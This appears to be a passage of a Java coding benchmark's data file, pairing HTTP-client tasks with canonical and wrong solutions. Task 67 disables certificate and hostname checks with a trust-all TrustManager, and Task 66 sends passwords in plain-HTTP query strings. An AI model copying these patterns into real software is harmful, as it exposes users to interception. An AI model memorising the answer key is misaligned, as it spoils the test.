(buffer[offset] << 8) | buffer[offset + 1];\n            offset += 2;\n            if (type == 1) {\n                byte[] ipBytes = new byte[4];\n                System.arraycopy(buffer, offset, ipBytes, 0, 4);\n                offset += 4;\n                ips.add(InetAddress.getByAddress(ipBytes));\n            }\n        }\n        return ips;\n    }\n\n    private String toTXT(byte[] buffer) {\n        int offset = 0;\n        int id = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int flags = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int qdcount = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int ancount = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int nscount = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n        int arcount = (buffer[offset] << 8) | buffer[offset + 1];\n        offset += 2;\n\n        for (int i = 0; i < qdcount; i++) {\n            int nameLength = 0;\n            while (buffer[offset + nameLength] != 0) {\n                nameLength += buffer[offset + nameLength] + 1;\n            }\n            offset += nameLength;\n            offset += 4; // type and class\n        }\n\n        for (int i = 0; i < ancount; i++) {\n            int nameLength = 0;\n            while (buffer[offset + nameLength] != 0) {\n                nameLength += buffer[offset + nameLength] + 1;\n            }\n            offset += nameLength;\n            int type = (buffer[offset] << 8) | buffer[offset + 1];\n            offset += 2;\n            int clazz = (buffer[offset] << 8) | buffer[offset + 1];\n            offset += 2;\n            int ttl = (buffer[offset] << 24) | (buffer[offset + 1] << 16) |\n                      (buffer[offset + 2] << 8) | buffer[offset + 3];\n            offset += 4;\n            int dataLength = (buffer[offset] << 8) | buffer[offset + 1];\n            offset += 2;\n            if (type == 16) {\n                byte[] txtBytes = new byte[dataLength];\n                System.arraycopy(buffer, offset, txtBytes, 0, dataLength);\n                offset += dataLength;\n                return new String(txtBytes);\n            }\n        }\n        throw new RuntimeException(\"TXT record not found\");\n    }\n}"
  },
  {
    "Task_id": 62,
    "Instruction": "Task Description: Create a function to check if a given URL is accessible and usable by sending a HEAD request and verifying the HTTP response code.\n\nFunction Description: The function checks the accessibility of a URL by attempting to establish a connection and sending a HEAD request. It returns true if the URL responds with HTTP OK (status code 200), indicating it's usable, and false otherwise (including invalid URLs or connection failures).\n\nInput: \n- url: String - The URL to be checked for accessibility.\n\nOutput: \n- boolean - Returns true if the URL is accessible (HTTP status code 200), false otherwise.",
    "Canonical_solution": "import java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic static boolean isUrlUsable(String url) {\n    if (CommonUtils.isEmpty(url)) {\n        return false;\n    }\n\n    URL urlTemp = null;\n    HttpURLConnection connt = null;\n    try {\n        urlTemp = new URL(url);\n        connt = (HttpURLConnection) urlTemp.openConnection();\n        connt.setRequestMethod(\"HEAD\");\n        int returnCode = connt.getResponseCode();\n        if (returnCode == HttpURLConnection.HTTP_OK) {\n            return true;\n        }\n    } catch (Exception e) {\n        return false;\n    } finally {\n        connt.disconnect();\n    }\n    return false;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "public static boolean isUrlAccessible(String url) {\n    if (url == null) {\n        return false;\n    }\n    try {\n        URL u = new URL(url);\n        HttpURLConnection conn = (HttpURLConnection) u.openConnection();\n        conn.setRequestMethod(\"HEAD\");\n        int responseCode = conn.getResponseCode();\n        return responseCode == 200;\n    } catch (Exception e) {\n        return false;\n    }\n}"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for sending feedback data to a remote server using HttpURLConnection.\n\nClass Description: The HttpFeedbackClient class provides functionality to send feedback content and environment information to a specified URL via HTTP POST request. It handles connection setup, parameter encoding, request sending, and response handling with appropriate callbacks for success or failure scenarios.\n\nAttributes:\ncontent: String - The feedback content to be sent to the server\nenv: String - The environment information associated with the feedback\ncallback: OnRequestCallback - The callback interface for handling request results\n\nMethods:\nsendFeedback: sendFeedback() -> void - Sends the feedback data to the server. Sets up the HTTP connection, encodes parameters, writes the request body, and processes the response. Calls onSuccess() or onFailure() on the callback object depending on the outcome.\n\nNote: The OnRequestCallback interface (not shown in the reference code) would typically contain two methods:\n- onSuccess(): Called when the request completes successfully\n- onFailure(Exception e): Called when the request fails, with the exception that occurred",
    "Canonical_solution": "import com.antfortune.freeline.idea.utils.NotificationUtils;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\n\npublic class HttpFeedbackClient {\n\n    private String content;\n    private String env;\n    private OnRequestCallback callback;\n\n    public HttpFeedbackClient(String content, String env, OnRequestCallback callback) {\n        this.content = content;\n        this.env = env;\n        this.callback = callback;\n    }\n\n    public void sendFeedback() {\n        try {\n            URL url = new URL(\"https://www.freelinebuild.com/api/feedback\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setReadTimeout(10000);\n            conn.setConnectTimeout(15000);\n            conn.setRequestMethod(\"POST\");\n            conn.setDoInput(true);\n            conn.setDoOutput(true);\n\n            StringBuilder builder = new StringBuilder();\n            builder.append(URLEncoder.encode(\"content\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(content, \"UTF-8\"));\n            builder.append(\"&\");\n            builder.append(URLEncoder.encode(\"env\", \"UTF-8\"));\n            builder.append(\"=\");\n            builder.append(URLEncoder.encode(env, \"UTF-8\"));\n\n            OutputStream os = conn.getOutputStream();\n            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, \"UTF-8\"));\n            writer.write(builder.toString());\n            writer.flush();\n            writer.close();\n            os.close();\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                this.callback.onFailure(new Exception(conn.getResponseMessage()));\n            } else {\n                this.callback.onSuccess();\n            }\n            conn.disconnect();\n        } catch (IOException e) {\n            this.callback.onFailure(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpFeedbackClient {\n    private String content;\n    private String env;\n    private OnRequestCallback callback;\n    private String url;\n\n    public HttpFeedbackClient(String url) {\n        this.url = url;\n    }\n\n    public void setContent(String content) {\n        this.content = content;\n    }\n\n    public void setEnv(String env) {\n        this.env = env;\n    }\n\n    public void setCallback(OnRequestCallback callback) {\n        this.callback = callback;\n    }\n\n    public void sendFeedback() {\n        if (content == null || env == null || callback == null) {\n            callback.onFailure(new IllegalArgumentException(\"Missing required parameters\"));\n            return;\n        }\n\n        try {\n            URL urlObj = new URL(this.url);\n            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            String postData = \"content=\" + URLEncoder.encode(content, \"UTF-8\") + \"&env=\" + URLEncoder.encode(env, \"UTF-8\");\n\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] data = postData.getBytes(StandardCharsets.UTF_8);\n                os.write(data);\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                callback.onSuccess();\n            } else {\n                callback.onFailure(new Exception(\"Server returned code: \" + responseCode));\n            }\n        } catch (Exception e) {\n            callback.onFailure(e);\n        }\n    }\n\n    public interface OnRequestCallback {\n        void onSuccess();\n        void onFailure(Exception e);\n    }\n}"
  },
  {
    "Task_id": 64,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using HttpURLConnection to make GET requests and handle responses.\n\nClass Description: The HttpClient class provides functionality to send HTTP GET requests to a specified URL and retrieve the response. It handles connection timeouts, sets appropriate request headers, and processes the response stream.\n\nAttributes: None\n\nMethods:\n- request: [Name](String url) -> String - Sends a GET request to the specified URL and returns the response body as a string. Sets connection timeout to 3 seconds, read timeout to 90 seconds, and configures appropriate request headers including content type and character encoding. Returns null if the request fails or response code is not 200.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpClient {\n\n    public String request(String url) {\n        HttpURLConnection connection = null;\n        BufferedReader reader = null;\n        try {\n            URL getUrl = new URL(url);\n            connection = (HttpURLConnection) getUrl.openConnection();\n            connection.setReadTimeout(90000);\n            connection.setConnectTimeout(3000);\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json\");\n            connection.setRequestProperty(\"Charset\", \"UTF-8\");\n            \n            if (200 == connection.getResponseCode()) {\n                reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n                StringBuilder result = new StringBuilder();\n                String line = null;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line);\n                }\n                return result.toString();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n        return null;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class HttpClient {\n    public String request(String url) {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.setConnectTimeout(3000);\n            conn.setReadTimeout(90000);\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(\"Accept-Charset\", \"UTF-8\");\n            conn.setRequestProperty(\"User-Agent\", \"JavaHttpClient\");\n            int responseCode = conn.getResponseCode();\n            if (responseCode != 200) {\n                return null;\n            }\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n            conn.disconnect();\n            return response.toString();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 65,
    "Instruction": "Task Description: Implement a class that handles preloading of HTTP content in the background using a thread pool, with support for cancellation and blacklisting of failed URLs.\n\nClass Description: The PreloadTask class is a Runnable implementation that preloads HTTP content from a given URL up to a specified length. It manages connection timeouts, handles failures by blacklisting URLs, and supports task cancellation. The class works with an HttpProxyCacheServer to get proxied URLs and executes tasks through an ExecutorService.\n\nAttributes:\n- mRawUrl: String - The original URL to be preloaded\n- mPosition: int - The position/index of this preload task (optional tracking)\n- mCacheServer: HttpProxyCacheServer - The proxy server used to get cached URLs\n- mIsCanceled: boolean - Flag indicating if the task was canceled\n- mIsExecuted: boolean - Flag indicating if the task was executed\n- blackList: static List<String> - Shared list of URLs that failed to load\n\nMethods:\n- run(): void - The main execution method called by the thread pool, which starts the preload task if not canceled\n- start(): void - Internal method that performs the actual HTTP request and content preloading\n- executeOn(ExecutorService executorService): void - Submits the task to the provided executor service\n- cancel(): void - Cancels the task if it has been executed but not completed",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class PreloadTask implements Runnable {\n\n    public String mRawUrl;\n    public int mPosition;\n    public HttpProxyCacheServer mCacheServer;\n    private boolean mIsCanceled;\n    private boolean mIsExecuted;\n    private final static List<String> blackList = new ArrayList<>();\n\n    @Override\n    public void run() {\n        if (!mIsCanceled) {\n            start();\n        }\n        mIsExecuted = false;\n        mIsCanceled = false;\n    }\n\n    private void start() {\n        if (blackList.contains(mRawUrl)) return;\n        HttpURLConnection connection = null;\n        try {\n            String proxyUrl = mCacheServer.getProxyUrl(mRawUrl);\n            URL url = new URL(proxyUrl);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(5_000);\n            connection.setReadTimeout(5_000);\n            InputStream in = new BufferedInputStream(connection.getInputStream());\n            int length;\n            int read = -1;\n            byte[] bytes = new byte[8 * 1024];\n            while ((length = in.read(bytes)) != -1) {\n                read += length;\n                if (mIsCanceled || read >= PreloadManager.PRELOAD_LENGTH) {\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            blackList.add(mRawUrl);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        if (mIsExecuted) return;\n        mIsExecuted = true;\n        executorService.submit(this);\n    }\n\n    public void cancel() {\n        if (mIsExecuted) {\n            mIsCanceled = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class PreloadTask implements Runnable {\n    private String mRawUrl;\n    private int mPosition;\n    private HttpProxyCacheServer mCacheServer;\n    private boolean mIsCanceled;\n    private boolean mIsExecuted;\n    private static List<String> blackList = new ArrayList<>();\n\n    public PreloadTask(String rawUrl, HttpProxyCacheServer cacheServer) {\n        this.mRawUrl = rawUrl;\n        this.mCacheServer = cacheServer;\n    }\n\n    @Override\n    public void run() {\n        if (mIsCanceled) {\n            return;\n        }\n        mIsExecuted = true;\n        start();\n    }\n\n    private void start() {\n        String proxiedUrl = mCacheServer.getProxiedUrl(mRawUrl);\n        try {\n            URL url = new URL(proxiedUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setConnectTimeout(5000);\n            conn.setReadTimeout(10000);\n            conn.setRequestMethod(\"GET\");\n            conn.setInstanceFollowRedirects(true);\n            if (mIsCanceled) return;\n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 400) {\n                blackList.add(proxiedUrl);\n                return;\n            }\n            if (mIsCanceled) return;\n            InputStream is = conn.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                if (mIsCanceled) {\n                    is.close();\n                    return;\n                }\n                // Process buffer\n            }\n            is.close();\n        } catch (IOException e) {\n            blackList.add(proxiedUrl);\n        } catch (Exception e) {\n            blackList.add(proxiedUrl);\n        }\n    }\n\n    public void executeOn(ExecutorService executorService) {\n        executorService.submit(this);\n    }\n\n    public void cancel() {\n        mIsCanceled = true;\n    }\n}"
  },
  {
    "Task_id": 66,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously using HttpURLConnection, specifically designed for Android applications to fetch and process JSON data from a server.\n\nClass Description: HttpRequestHandler is a utility class containing an inner AsyncTask subclass (MyAsyncTaskgetNews) that performs HTTP GET requests in the background. It handles connection setup, timeout configuration, input stream processing, and JSON response parsing. The class demonstrates typical operations for user authentication flows.\n\nAttributes:\n- None (All required objects are created locally within methods)\n\nMethods:\n- MyAsyncTaskgetNews: [Inner Class] - Extends AsyncTask<String, String, String> to perform network operations off the UI thread\n  - doInBackground(String... params) -> String - Main execution method that:\n    1. Takes URL string as input parameter\n    2. Establishes HTTP connection with 7-second timeout\n    3. Reads input stream and converts to string\n    4. Publishes progress with response data\n    5. Returns null (results handled via progress updates)\n  \n  - onProgressUpdate(String... progress) -> void - UI thread callback that:\n    1. Parses JSON response\n    2. Handles \"user is added\" case by showing toast and initiating login\n    3. Processes successful login by saving user credentials\n    4. Handles errors via logging\n\nNote: The class assumes existence of helper classes (Operations for stream conversion, SaveSettings for persistence) and Android context availability via getApplicationContext().",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    Operations operations = new Operations(getApplicationContext());\n                    NewsData = operations.ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                if (json.getString(\"msg\") == null)\n                    return;\n                if (json.getString(\"msg\").equalsIgnoreCase(\"user is added\")) {\n                    Toast.makeText(getApplicationContext(), json.getString(\"msg\"), Toast.LENGTH_LONG).show();\n                    String url = \"http://10.0.2.2/~hussienalrubaye/twitterserver/login.php?email=\" + etEmail.getText().toString() + \"&password=\" + etPassword.getText().toString();\n                    new MyAsyncTaskgetNews().execute(url);\n                }\n\n                if (json.getString(\"msg\").equalsIgnoreCase(\"Pass Login\")) {\n                    JSONArray UserInfo = new JSONArray(json.getString(\"info\"));\n                    JSONObject UserCreintal = UserInfo.getJSONObject(0);\n                    hideProgressDialog();\n                    SaveSettings saveSettings = new SaveSettings(getApplicationContext());\n                    saveSettings.SaveData(UserCreintal.getString(\"user_id\"));\n                    finish();\n                }\n            } catch (Exception ex) {\n                Log.d(\"er\", ex.getMessage());\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import android.widget.Toast;\nimport android.util.Log;\nimport java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.InputStream;\nimport org.json.JSONObject;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.BufferedReader;\n\npublic class HttpRequestHandler {\n    private static final int TIME_OUT = 7000;\n\n    public void fetchNews(String url) {\n        new MyAsyncTaskgetNews().execute(url);\n    }\n\n    private class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            String urlString = params[0];\n            try {\n                URL url = new URL(urlString);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setConnectTimeout(TIME_OUT);\n                conn.setReadTimeout(TIME_OUT);\n                conn.setRequestMethod(\"GET\");\n                conn.connect();\n                int responseCode = conn.getResponseCode();\n                if (responseCode == HttpURLConnection.HTTP_OK) {\n                    InputStream inputStream = conn.getInputStream();\n                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n                    StringBuilder response = new StringBuilder();\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                    reader.close();\n                    publishProgress(response.toString());\n                } else {\n                    publishProgress(\"Error: \" + responseCode);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n                publishProgress(\"Error: \" + e.getMessage());\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            String response = progress[0];\n            try {\n                JSONObject json = new JSONObject(response);\n                String status = json.getString(\"status\");\n                if (status.equals(\"user is added\")) {\n                    Toast.makeText(getApplicationContext(), \"User added\", Toast.LENGTH_SHORT).show();\n                    // Initiate login\n                } else if (status.equals(\"success\")) {\n                    SaveSettings.saveCredentials(json.getString(\"username\"), json.getString(\"token\"));\n                } else {\n                    Log.e(\"HttpRequestHandler\", \"Unexpected status: \" + status);\n                }\n            } catch (JSONException e) {\n                Log.e(\"HttpRequestHandler\", \"JSON parsing error\", e);\n            } catch (Exception e) {\n                Log.e(\"HttpRequestHandler\", \"Error processing response\", e);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a Java utility class for making HTTP POST requests with JSON payloads, handling both HTTP and HTTPS connections, including SSL certificate verification bypass for HTTPS, and processing JSON responses.\n\nClass Description: XxlJobRemotingUtil is a utility class designed to handle remote HTTP communication with JSON payloads, particularly for interacting with the XXL-JOB scheduler. It provides methods for making POST requests with proper headers, timeout settings, and access token authentication.\n\nAttributes:\n- logger: Logger - SLF4J logger for error and debug logging\n- XXL_JOB_ACCESS_TOKEN: String - Constant string for the access token header name\n- trustAllCerts: TrustManager[] - Array of trust managers that don't validate certificates\n\nMethods:\n- trustAllHosts(HttpsURLConnection connection) -> void - Configures the HTTPS connection to trust all hosts and certificates\n- postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) -> ReturnT - Makes an HTTP POST request with JSON payload and processes the JSON response\n\nMethod Details:\n1. trustAllHosts(HttpsURLConnection connection) -> void\n   - Input: HttpsURLConnection connection - The HTTPS connection to configure\n   - Description: Sets up SSL context to trust all certificates and hosts for the given HTTPS connection\n\n2. postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) -> ReturnT\n   - Input:\n     - url: String - The target URL for the POST request\n     - accessToken: String - Authentication token for the request\n     - timeout: int - Read timeout in seconds\n     - requestObj: Object - The object to be serialized as JSON request body\n     - returnTargClassOfT: Class - The class type for deserializing the response\n   - Output: ReturnT - A generic return type containing either the successful response or error information\n   - Description: \n     1. Creates and configures an HTTP/HTTPS connection\n     2. Sets request headers including content type and access token\n     3. Serializes the request object to JSON and sends it\n     4. Reads and deserializes the JSON response\n     5. Handles errors and connection cleanup",
    "Canonical_solution": "import com.xxl.job.core.biz.model.ReturnT;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.net.ssl.*;\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\n\npublic class XxlJobRemotingUtil {\n    private static Logger logger = LoggerFactory.getLogger(XxlJobRemotingUtil.class);\n    public static final String XXL_JOB_ACCESS_TOKEN = \"XXL-JOB-ACCESS-TOKEN\";\n\n    private static final TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    }};\n\n    private static void trustAllHosts(HttpsURLConnection connection) {\n        try {\n            SSLContext sc = SSLContext.getInstance(\"TLS\");\n            sc.init(null, trustAllCerts, new java.security.SecureRandom());\n            SSLSocketFactory newFactory = sc.getSocketFactory();\n            connection.setSSLSocketFactory(newFactory);\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        }\n        connection.setHostnameVerifier(new HostnameVerifier() {\n            public boolean verify(String hostname, SSLSession session) {\n                return true;\n            }\n        });\n    }\n\n    public static ReturnT postBody(String url, String accessToken, int timeout, Object requestObj, Class returnTargClassOfT) {\n        HttpURLConnection connection = null;\n        BufferedReader bufferedReader = null;\n        try {\n            URL realUrl = new URL(url);\n            connection = (HttpURLConnection) realUrl.openConnection();\n\n            boolean useHttps = url.startsWith(\"https\");\n            if (useHttps) {\n                HttpsURLConnection https = (HttpsURLConnection) connection;\n                trustAllHosts(https);\n            }\n\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setReadTimeout(timeout * 1000);\n            connection.setConnectTimeout(3 * 1000);\n            connection.setRequestProperty(\"connection\", \"Keep-Alive\");\n            connection.setRequestProperty(\"Content-Type\", \"application/json;charset=UTF-8\");\n            connection.setRequestProperty(\"Accept-Charset\", \"application/json;charset=UTF-8\");\n\n            if(accessToken!=null && accessToken.trim().length()>0){\n                connection.setRequestProperty(XXL_JOB_ACCESS_TOKEN, accessToken);\n            }\n\n            connection.connect();\n\n            if (requestObj != null) {\n                String requestBody = GsonTool.toJson(requestObj);\n                DataOutputStream dataOutputStream = new DataOutputStream(connection.getOutputStream());\n                dataOutputStream.write(requestBody.getBytes(\"UTF-8\"));\n                dataOutputStream.flush();\n                dataOutputStream.close();\n            }\n\n            int statusCode = connection.getResponseCode();\n            if (statusCode != 200) {\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting fail, StatusCode(\"+ statusCode +\") invalid. for url : \" + url);\n            }\n\n            bufferedReader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n            StringBuilder result = new StringBuilder();\n            String line;\n            while ((line = bufferedReader.readLine()) != null) {\n                result.append(line);\n            }\n            String resultJson = result.toString();\n\n            try {\n                ReturnT returnT = GsonTool.fromJson(resultJson, ReturnT.class, returnTargClassOfT);\n                return returnT;\n            } catch (Exception e) {\n                logger.error(\"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\", e);\n                return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting (url=\"+url+\") response content invalid(\"+ resultJson +\").\");\n            }\n\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n            return new ReturnT<String>(ReturnT.FAIL_CODE, \"xxl-rpc remoting error(\"+ e.getMessage() +\"), for url : \" + url);\n        } finally {\n            try {\n                if (bufferedReader != null) {\n                    bufferedReader.close();\n                }\n                if (connection != null) {\n                    connection.disconnect();\n                }\n            } catch (Exception e2) {\n                logger.error(e2.getMessage(), e2);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.net.*;\nimport java.security.cert.X509Certificate;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class XxlJobRemotingUtil {\n    private static final Logger logger = LoggerFactory.getLogger(XxlJobRemotingUtil.class);\n    private static final String XXL_JOB_ACCESS_TOKEN = \"XXL-JOB-ACCESS-TOKEN\";\n    private static final TrustManager[] trustAllCerts = new TrustManager[] {\n        new X509TrustManager() {\n            public X509Certificate[] getAcceptedIssuers() { return null; }\n            public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n            public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n        }\n    };\n\n    public void trustAllHosts(HttpsURLConnection connection) {\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\");\n            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n            connection.setSSLSocketFactory(sslContext.getSocketFactory());\n            connection.setHostnameVerifier((hostname, session) -> true);\n        } catch (Exception e) {\n            logger.error(\"Error configuring SSL context\", e);\n        }\n    }\n\n    public <ReturnT> ReturnT postBody(String url, String accessToken, int timeout, Object requestObj, Class<ReturnT> returnTargClassOfT) {\n        try {\n            URL urlObj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n            if (url.startsWith(\"https://\")) {\n                trustAllHosts((HttpsURLConnection) conn);\n            }\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(timeout * 1000);\n            conn.setReadTimeout(timeout * 1000);\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            conn.setRequestProperty(XXL_JOB_ACCESS_TOKEN, accessToken);\n            conn.setDoOutput(true);\n\n            ObjectMapper mapper = new ObjectMapper();\n            String jsonRequest = mapper.writeValueAsString(requestObj);\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = jsonRequest.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n\n            int responseCode = conn.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                try (InputStream is = conn.getInputStream()) {\n                    String jsonResponse = new String(is.readAllBytes(), \"utf-8\");\n                    return mapper.readValue(jsonResponse, returnTargClassOfT);\n                }\n            } else {\n                logger.error(\"HTTP error code: {}\", responseCode);\n                try (InputStream is = conn.getErrorStream()) {\n                    String errorResponse = new String(is.readAllBytes(), \"utf-8\");\n                    logger.error(\"Error response: {}\", errorResponse);\n                    return null;\n                }\n            }\n        } catch (Exception e) {\n            logger.error(\"Error making POST request\", e);\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 68,
    "Instruction": "Task Description: Create a utility class for making HTTP POST requests with configurable timeouts and form data submission capabilities.\n\nClass Description: TinyIdHttpUtils is a utility class that provides static methods for performing HTTP POST requests. It handles connection management, timeout configuration, form data encoding, and response reading. The class is designed to be thread-safe and includes proper resource cleanup.\n\nAttributes:\n- logger: Logger - Used for logging errors and warnings during HTTP operations\n\nMethods:\n- post(String url, Integer readTimeout, Integer connectTimeout) -> String - Makes a POST request to the specified URL with given timeout values\n- post(String url, Map<String,String> form, Integer readTimeout, Integer connectTimeout) -> String - Makes a POST request with form data to the specified URL with given timeout values",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class TinyIdHttpUtils {\n\n    private static final Logger logger = Logger.getLogger(TinyIdHttpUtils.class.getName());\n\n    private TinyIdHttpUtils() {\n    }\n\n    public static String post(String url, Integer readTimeout, Integer connectTimeout) {\n        return post(url, null, readTimeout, connectTimeout);\n    }\n\n    public static String post(String url, Map<String, String> form, Integer readTimeout, Integer connectTimeout) {\n        HttpURLConnection conn = null;\n        OutputStreamWriter os = null;\n        BufferedReader rd = null;\n        StringBuilder param = new StringBuilder();\n        StringBuilder sb = new StringBuilder();\n        String line = null;\n        String response = null;\n        if (form != null) {\n            for (Map.Entry<String, String> entry : form.entrySet()) {\n                String key = entry.getKey();\n                if (param.length() != 0) {\n                    param.append(\"&\");\n                }\n                param.append(key).append(\"=\").append(entry.getValue());\n            }\n        }\n        try {\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setReadTimeout(readTimeout);\n            conn.setConnectTimeout(connectTimeout);\n            conn.setUseCaches(false);\n            conn.connect();\n            os = new OutputStreamWriter(conn.getOutputStream(), \"UTF-8\");\n            os.write(param.toString());\n            os.flush();\n            rd = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"UTF-8\"));\n            while ((line = rd.readLine()) != null) {\n                sb.append(line);\n            